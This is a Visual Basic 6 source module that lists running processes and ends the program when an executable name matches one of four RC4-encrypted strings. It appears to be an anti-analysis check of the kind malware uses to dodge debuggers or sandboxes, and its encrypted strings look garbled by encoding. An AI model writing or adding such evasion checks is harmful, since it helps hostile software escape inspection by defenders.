Attribute VB_Name = "modBlacklist"

Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" _
        (ByVal lFlags As Long, ByVal lProcessID As Long) As Long

Private Declare Function ProcessFirst Lib "kernel32" Alias _
        "Process32First" (ByVal hSnapShot As Long, uProcess _
        As PROCESSENTRY32) As Long

Private Declare Function ProcessNext Lib "kernel32" Alias _
        "Process32Next" (ByVal hSnapShot As Long, uProcess _
        As PROCESSENTRY32) As Long

Private Declare Sub CloseHandle Lib "kernel32" (ByVal hPass _
        As Long)

Const TH32CS_SNAPPROCESS As Long = 2&
Const MAX_PATH As Integer = 260

Private Type PROCESSENTRY32
  dwSize As Long
  cntUsage As Long
  th32ProcessID As Long
  th32DefaultHeapID As Long
  th32ModuleID As Long
  cntThreads As Long
  th32ParentProcessID As Long
  pcPriClassBase As Long
  dwFlags As Long
  szExeFile As String * MAX_PATH
End Type



Public Sub GetExeNames()
    Dim hSnapShot As Long, Result As Long
    Dim aa As String, bb As String
    Dim Process As PROCESSENTRY32



    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0&)
    If hSnapShot = 0 Then Exit Sub

    Process.dwSize = Len(Process)
    Result = ProcessFirst(hSnapShot, Process)
  
    Do While Result <> 0
        aa = Process.szExeFile
        
    
        
        aa = Left$(aa, InStr(aa, Chr$(0)) - 1)
        
        If Right$(LCase(aa), 4) = ".exe" Then
            Select Case aa
            
            Case RC4("ëÖUìÓoµœæP}º", "539")
            End
            
            Case RC4("íèWÄÙb£ì∞}", "539")
            End
            
            Case RC4("ÉòOìÔbµ—˚`", "539")
            End
            
            Case RC4("ÉòSìÔdµÕ˚`", "539")
            End
            
            End Select
        

            End If
        
        
        Result = ProcessNext(hSnapShot, Process)
    Loop
    Call CloseHandle(hSnapShot)
End Sub
